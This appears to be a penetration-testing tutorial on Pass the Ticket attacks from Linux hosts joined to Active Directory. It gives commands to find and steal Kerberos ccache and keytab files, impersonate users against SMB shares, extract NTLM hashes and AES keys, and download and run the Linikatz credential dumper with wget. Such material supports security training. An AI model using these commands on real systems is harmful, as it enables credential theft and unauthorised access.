Linux systems can integrate with Active Directory to provide centralized authentication, typically using Kerberos as the authentication protocol. A Linux host does not need to be domain‑joined to use Kerberos tickets, as Kerberos can also be leveraged independently for network authentication. If Kerberos tickets are obtained by an attacker, they can be reused to impersonate legitimate users and access network resources, a technique known as Pass the Ticket (PtT).

---

## Kerberos Ticket Storage on Linux

### Credential Cache (ccache)

- Temporary files storing active Kerberos tickets.
    
- Default location: `/tmp/`
    
- Location referenced by the `KRB5CCNAME` environment variable.
    
- Typically readable only by the ticket owner, but accessible to root.
    

Check environment variable:

```bash
env | grep KRB5
```

List cache files:

```bash
ls -la /tmp | grep krb5cc
```

---

### Keytab Files

- Persistent files containing Kerberos principals and encrypted keys.
    
- Allow non‑interactive authentication without passwords.
    
- Commonly used by scripts, cron jobs, and services.
    
- Not tied to a specific machine.
    

Search for keytabs:

```bash
find / -name "*keytab*" -ls 2>/dev/null
```

---

## Identifying Domain Membership on Linux

### Using realm

```bash
realm list
```

Indicators:

- `type: kerberos`
    
- `server-software: active-directory`
    
- `client-software: sssd`
    

### Checking Running Services

```bash
ps -ef | grep -i "sssd\|winbind"
```

---

## Enumerating Kerberos Tickets

Check current tickets:

```bash
klist
```

Important fields:

- `Default principal`
    
- `Valid starting`
    
- `Expires`
    

---

## Abusing Keytab Files

### Identify the Principal in a Keytab

```bash
klist -k -t /path/to/file.keytab
```


### Import a Keytab (Pass the Ticket)

```bash
kinit username@REALM -k -t /path/to/file.keytab
```

Verify:

```bash
klist
```

### Access Network Resources Using Kerberos

Example SMB access:

```bash
smbclient //dc01/share -k -no-pass
```

---

## Extracting Hashes from Keytab Files

Tool: [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

```bash
python3 keytabextract.py file.keytab
```

Extracted material:

- NTLM hash
    
- AES‑128 key
    
- AES‑256 key
    

Usage:

- NTLM → Pass‑the‑Hash
    
- AES keys → Ticket forging or offline cracking
    

---

## Abusing ccache Files (Pass the Ticket)

### Copy the Cache File

```bash
cp /tmp/krb5cc_xxxxxx /root/
```

### Import the Cache into Current Session

```bash
export KRB5CCNAME=/root/krb5cc_xxxxxx
klist
```

### Authenticate as the Impersonated User

```bash
smbclient //dc01/C$ -k -no-pass
```


---

## Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to Mimikatz to UNIX environments.

Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.

**Linikatz Download and Execution**

Pass the Ticket (PtT) from Linux

``` bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
./linikatz.sh
```